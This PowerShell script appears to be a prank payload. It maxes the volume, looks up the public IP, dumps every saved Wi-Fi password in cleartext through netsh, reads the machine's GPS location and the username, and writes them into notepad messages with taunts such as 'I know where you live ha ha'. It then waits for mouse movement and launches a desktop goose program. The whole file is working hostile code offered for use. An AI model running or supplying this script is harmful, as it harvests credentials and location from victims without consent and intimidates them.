#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# This turns the volume up to max level--------------------------------------------------------------------

$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}

#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

function Get-PubIP {

    try {

    $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content

    }
 
 # If no Public IP is detected function will return $null to avoid sapi speak

    # Write Error is just for troubleshooting 
    catch {Write-Error "No Public IP was detected" 
    return $null
    -ErrorAction SilentlyContinue
    }

$pubIP = @"
Your public  IP address 
is $computerPubIP
"@

$pubIP > $env:TEMP\hg\Assets\Text\NotepadMessages\pubIP.txt
}

Get-PubIP

#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

function Get-wifi{
	try {
	    $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASS=$pass }} | Format-Table -AutoSize | Out-String }


    # Write Error is just for troubleshooting
    catch {Write-Error "No coordinates found" 
    -ErrorAction SilentlyContinue
    } 

$wifiMsg = @"
These your wifi passwords?
$wifiProfiles
"@

$wifiMsg > $env:TEMP\hg\Assets\Text\NotepadMessages\wifi.txt
}
Get-wifi

#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

function Get-GeoLocation{
	try {
	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
	$GeoWatcher.Start() #Begin resolving current locaton

	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
		Start-Sleep -Milliseconds 100 #Wait for discovery.
	}  

	if ($GeoWatcher.Permission -eq 'Denied'){
		Write-Error 'Access Denied for Location Information'
	} else {
		$GeoLocation = $GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
$GeoLocation = $GeoLocation -split " "
$Lat = $GeoLocation[0].Substring(11) -replace ".$"
$Lon = $GeoLocation[1].Substring(10) -replace ".$"

$GeoMsg = @"
I know where you live ha ha

Latitude: $Lat
___
Longitude: $Lon
___
"@
$GeoMsg > $env:TEMP\hg\Assets\Text\NotepadMessages\location.txt
	}
	}
    # Write Error is just for troubleshooting
    catch {Write-Error "No coordinates found" 
    -ErrorAction SilentlyContinue
    } 

}
Get-GeoLocation

#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

function Get-fullName {

    try {
    $fullName = (Get-LocalUser -Name $env:USERNAME).Name
    echo "Hi $fullName" > $env:TEMP\hg\Assets\Text\NotepadMessages\name.txt
    }
 
 # If no name is detected function will return $env:USERNAME 

    # Write Error is just for troubleshooting 
    catch {Write-Error "No name was detected" 
    echo "Hi $env:UserName" > $env:TEMP\hg\Assets\Text\NotepadMessages\name.txt
    -ErrorAction SilentlyContinue
    }

}
Get-fullName

function startGoose {
start-process $env:TEMP\hg\GooseDesktop.exe
}

function Target-Comes {
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}

Target-Comes
startGoose

